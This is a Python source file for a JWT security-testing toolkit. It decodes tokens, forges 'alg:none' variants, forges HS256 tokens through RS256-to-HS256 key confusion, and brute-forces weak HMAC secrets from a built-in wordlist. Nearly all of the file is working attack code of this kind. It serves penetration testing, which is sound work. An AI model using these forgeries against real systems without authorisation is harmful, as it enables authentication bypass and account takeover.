"""
tools/specialized/jwt_toolkit.py — JWT security testing toolkit.

Tests for alg:none, key confusion (RS→HS), brute-force weak secrets,
and token manipulation.  Uses PyJWT and python-jose.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


@dataclass
class JWTAnalysis:
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature: str
    vulnerabilities: List[str] = field(default_factory=list)
    cracked_secret: Optional[str] = None
    forged_tokens: List[str] = field(default_factory=list)


class JWTToolkit:
    """
    JWT security analysis & exploitation toolkit.

    * ``decode()``           — decode without verification
    * ``test_alg_none()``    — forge token with alg:none
    * ``test_key_confusion()`` — RS256→HS256 key confusion
    * ``brute_secret()``     — dictionary attack on HMAC secret
    * ``full_analysis()``    — run all tests
    """

    # Common weak secrets for brute-forcing
    DEFAULT_WORDLIST: List[str] = [
        "secret", "password", "123456", "key", "admin",
        "test", "jwt_secret", "changeme", "supersecret",
        "your-256-bit-secret", "shhhhh", "default",
        "my_secret_key", "token_secret", "s3cr3t",
    ]

    # ------------------------------------------------------------------
    # Decode
    # ------------------------------------------------------------------

    def decode(self, token: str) -> JWTAnalysis:
        """Decode a JWT without signature verification."""
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError("Invalid JWT format — expected 3 dot-separated parts")

        header = self._b64_decode_json(parts[0])
        payload = self._b64_decode_json(parts[1])
        signature = parts[2]

        return JWTAnalysis(
            header=header,
            payload=payload,
            signature=signature,
        )

    # ------------------------------------------------------------------
    # alg:none attack
    # ------------------------------------------------------------------

    def test_alg_none(self, token: str) -> JWTAnalysis:
        """
        Forge a token with ``alg: none`` (CVE-2015-9235).

        Returns the analysis with a forged token appended.
        """
        analysis = self.decode(token)

        # Build alg:none variants
        for alg_val in ["none", "None", "NONE", "nOnE"]:
            forged_header = dict(analysis.header)
            forged_header["alg"] = alg_val

            h = self._b64_encode_json(forged_header)
            p = self._b64_encode_json(analysis.payload)
            forged = f"{h}.{p}."
            analysis.forged_tokens.append(forged)

        analysis.vulnerabilities.append("alg:none bypass — forged tokens generated")
        return analysis

    # ------------------------------------------------------------------
    # Key confusion (RS256 → HS256)
    # ------------------------------------------------------------------

    def test_key_confusion(self, token: str, public_key: str) -> JWTAnalysis:
        """
        RS256 → HS256 key confusion attack.

        If the server accepts HS256 signed with the RS public key,
        the token is forged successfully.
        """
        analysis = self.decode(token)

        if analysis.header.get("alg") not in ("RS256", "RS384", "RS512"):
            analysis.vulnerabilities.append(
                "key_confusion: token is not RSA-signed — attack not applicable"
            )
            return analysis

        try:
            import jwt as pyjwt  # type: ignore[import-untyped]

            forged_header = dict(analysis.header)
            forged_header["alg"] = "HS256"

            forged = pyjwt.encode(
                analysis.payload,
                key=public_key,
                algorithm="HS256",
                headers=forged_header,
            )
            analysis.forged_tokens.append(forged)
            analysis.vulnerabilities.append(
                "key_confusion: RS→HS forged token generated — test against server"
            )
        except Exception as exc:
            logger.warning("jwt.key_confusion_error: %s", exc)

        return analysis

    # ------------------------------------------------------------------
    # Brute-force HMAC secret
    # ------------------------------------------------------------------

    def brute_secret(
        self,
        token: str,
        wordlist: Optional[List[str]] = None,
    ) -> JWTAnalysis:
        """
        Dictionary attack against HMAC-signed JWT.

        Tries each candidate in *wordlist* and returns ``cracked_secret``
        if a match is found.
        """
        analysis = self.decode(token)
        alg = analysis.header.get("alg", "HS256")

        if alg not in ("HS256", "HS384", "HS512"):
            analysis.vulnerabilities.append(
                f"brute_secret: algorithm is {alg} — HMAC brute not applicable"
            )
            return analysis

        candidates = wordlist or self.DEFAULT_WORDLIST

        try:
            import jwt as pyjwt  # type: ignore[import-untyped]

            for secret in candidates:
                try:
                    pyjwt.decode(token, key=secret, algorithms=[alg])
                    analysis.cracked_secret = secret
                    analysis.vulnerabilities.append(
                        f"Weak HMAC secret found: '{secret}'"
                    )
                    return analysis
                except pyjwt.InvalidSignatureError:
                    continue
                except pyjwt.ExpiredSignatureError:
                    # Signature valid even if expired
                    analysis.cracked_secret = secret
                    analysis.vulnerabilities.append(
                        f"Weak HMAC secret found: '{secret}' (token expired)"
                    )
                    return analysis
                except Exception:
                    continue
        except ImportError:
            logger.warning("pyjwt not installed — brute_secret unavailable")

        return analysis

    # ------------------------------------------------------------------
    # Full analysis
    # ------------------------------------------------------------------

    def full_analysis(
        self,
        token: str,
        public_key: Optional[str] = None,
        wordlist: Optional[List[str]] = None,
    ) -> JWTAnalysis:
        """Run all JWT security tests."""
        analysis = self.decode(token)

        # Check expiry
        exp = analysis.payload.get("exp")
        if exp and float(exp) < time.time():
            analysis.vulnerabilities.append("Token is expired")

        # alg:none
        none_result = self.test_alg_none(token)
        analysis.forged_tokens.extend(none_result.forged_tokens)
        analysis.vulnerabilities.extend(none_result.vulnerabilities)

        # Key confusion
        if public_key:
            kc_result = self.test_key_confusion(token, public_key)
            analysis.forged_tokens.extend(kc_result.forged_tokens)
            analysis.vulnerabilities.extend(kc_result.vulnerabilities)

        # Brute secret
        brute_result = self.brute_secret(token, wordlist)
        if brute_result.cracked_secret:
            analysis.cracked_secret = brute_result.cracked_secret
        analysis.vulnerabilities.extend(brute_result.vulnerabilities)

        # Deduplicate
        analysis.vulnerabilities = list(dict.fromkeys(analysis.vulnerabilities))
        analysis.forged_tokens = list(dict.fromkeys(analysis.forged_tokens))
        return analysis

    # ------------------------------------------------------------------
    # Base64 helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _b64_decode_json(segment: str) -> Dict[str, Any]:
        padded = segment + "=" * (-len(segment) % 4)
        raw = base64.urlsafe_b64decode(padded)
        return json.loads(raw)

    @staticmethod
    def _b64_encode_json(obj: Dict[str, Any]) -> str:
        raw = json.dumps(obj, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
